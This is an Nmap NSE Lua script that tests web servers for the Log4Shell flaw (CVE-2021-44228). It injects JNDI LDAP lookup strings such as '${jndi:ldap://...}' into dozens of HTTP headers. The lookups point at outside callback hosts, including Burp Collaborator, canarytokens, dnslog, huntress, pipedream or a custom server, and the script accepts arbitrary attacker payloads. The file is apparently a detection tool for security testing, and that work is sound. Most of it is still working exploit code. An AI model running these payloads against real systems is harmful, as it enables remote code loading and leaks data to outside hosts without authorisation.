local http = require "http"
local httpspider = require "httpspider"
local shortport = require "shortport"
local stdnse = require "stdnse" 
local url = require "url"


description = [[
Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, 
and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. 
An attacker who can control log messages or log message parameters can execute arbitrary code 
loaded from LDAP servers when message lookup substitution is enabled. 

Reference
https://www.lunasec.io/docs/blog/log4j-zero-day/ 
https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
https://issues.apache.org/jira/browse/LOG4J2-3221
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
]]

---
-- @usage
-- nmap --script=http-log4shell --script-args='callback_type=[collaborator, canary, interactsh, dnslog, huntress, requestbin],\
--                              callback_token=[token],inject=[header,x-api-version]' <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 443/tcp open  https   syn-ack
-- |_http-log4shell: Check the email or webhook for the canary token [token]
--
-- @args http-log4shell.callback_type value can be collaborator, canary, interactsh, dnslog, huntress or requestbin.
--       The argument can also take custom url, for e.g.: callback_type="mycallbackserver.com:4444"
-- @args http-log4shell.callback_token value is the unique token based on the callback_type specified.
--       For e.g: <token>.canarytokens.com
-- @args http-log4shell.payload value is the attack payload. (default: ${hostName})
-- @args http-log4shell.inject value headers can spray the payload to all possible headers. The value can accept 
--       custom header value.
-- @args http-log4shell.uri value is the request path. The uri value can accept payload in the parameters as well.
--       This is an optional argument. (default: /)
-- @args http-log4shell.post_data is the post data parameters. This is an optional argument.
--  
---

author = "Sanoop Thomas"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "vuln", "exploit"}

portrule = shortport.http 

local default_payload = '${hostName}'

local headers = { 
  'Accept-Charset','Accept-Datetime','Accept-Encoding','Accept-Language',
  'Cache-Control','Cookie','Forwarded','Forwarded-For','Forwarded-For-IP',
  'Forwarded-Proto','From','Max-Forwards','Origin','Pragma','Referer',
  'True-Client-IP','Via','Warning','X-API-Version','X-ATT-Deviceid',
  'X-Correlation-ID','X-CSRF-Token','X-Csrftoken','X-Do-Not-Track',
  'X-Forward-For','X-Forward-Proto','X-Forwarded','X-Forwarded-By',
  'X-Forwarded-For','X-Forwarded-For-Original','X-Forwarded-Host',
  'X-Forwarded-Port','X-Forwarded-Proto','X-Forwarded-Protocol',
  'X-Forwarded-Scheme','X-Forwarded-Server','X-Forwarded-Ssl',
  'X-Forwarder-For','X-Frame-Options','X-From','X-Geoip-Country',
  'X-Http-Destinationurl','X-Http-Host-Override','X-Http-Method',
  'X-Http-Method-Override','X-Http-Path-Override','X-Https','X-Htx-Agent',
  'X-Hub-Signature','X-If-Unmodified-Since','X-Imbo-Test-Config','X-Insight',
  'X-Ip','X-Ip-Trail','X-Proxyuser-Ip','X-Request-Id','X-Requested-With',
  'X-Uidh','X-Wap-Profile','X-Xsrf-Token'
} 

local msg = nil

-- We use this for debugging 
local function dbg(str,...)
  stdnse.debug2(str, ...)
end

-- Let's prepare the attack payload and return message
local function get_callback(ctype, ctoken, cpayload) 
  if ctype == 'collaborator' then
    msg = ("Check the collaborator for the token %s"):format(ctoken)
    return ('${jndi:ldap://%s.%s.burpcollaborator.net'):format(cpayload, ctoken) 
  elseif ctype == 'canary' then
    msg = ("Check the email or webhook for the canary token %s"):format(ctoken)
    return ('${jndi:ldap://x%s.L4J.%s.canarytokens.com/a}'):format(cpayload,ctoken) 
  elseif ctype =='interactsh' then
    msg = ("Check https://app.interactsh.com for the token %s"):format(ctoken)
    return ('%s.interact.sh/%s'):format(ctoken,cpayload) 
  elseif ctype == 'dnslog' then
    msg = ("Check http://dnslog.cn for the domain %s.dnslog.cn"):format(ctoken)
    return ('${jndi:ldap://%s.%s.dnslog.cn}'):format(cpayload,ctoken) 
  elseif ctype == 'huntress' then
    msg = ("Check https://log4shell.huntress.com/view/%s"):format(ctoken)
    return ('${jndi:ldap://log4shell.huntress.com:1389/%s}'):format(ctoken) 
  elseif ctype == 'requestbin' then
    msg = ("Check https://%s.m.pipedream.net"):format(ctoken)
    return ('${jndi:ldap://https://%s.m.pipedream.net/%s}'):format(ctoken,cpayload) 
  else
    msg = ("Check https://%s.m.pipedream.net"):format(ctoken)
    return ('${jndi:ldap://%s/%s}'):format(ctype,cpayload) 
  end 
end

action = function(host, port)
  
  local callback_type, callback_url, payload, uri, post_data, method

  local header = {}
  
  -- Let's parse the script argument 
  if nmap.registry.args.callback_type then 
    callback_type = tostring(nmap.registry.args.callback_type) 
  end

  if nmap.registry.args.callback_token then 
    callback_token = tostring(nmap.registry.args.callback_token) 
  end

  if nmap.registry.args.payload then 
    attack_payload = tostring(nmap.registry.args.payload) 
  else 
    attack_payload = default_payload
  end

  if nmap.registry.args.inject then 
    inject = tostring(nmap.registry.args.inject) 
  end

  if nmap.registry.args.uri then 
    uri = tostring(nmap.registry.args.uri) 
  else
    uri = "/"
  end

  if nmap.registry.args.post_data then 
    post_data = tostring(nmap.registry.args.post_data) 
  end 

  if callback_type == nil or callback_token == nil or inject == nil then
    dbg('ERROR: script arguments callback_type, callback_token, and inject should not be nil.') 
  else
    payload = get_callback(callback_type, callback_token, attack_payload)
  end

  local options = {
    header = {
      Host = host.ip,
      Connection = "close"
    },
    bypass_cache = true,
    no_cache = true
  }

  if post_data then 
    method = "POST"
    options['content'] = post_data
  else 
    method = 'GET'
  end  

  dbg('DEBUG: attack payload is ' .. payload) 

  if (inject == 'header') then 
    for i, h in ipairs(headers) do
      options['header'][h] = payload
    end
  else
    options['header'][inject] = payload
  end   

  local response = http.generic_request(host,port,method,uri,options)

  return msg

end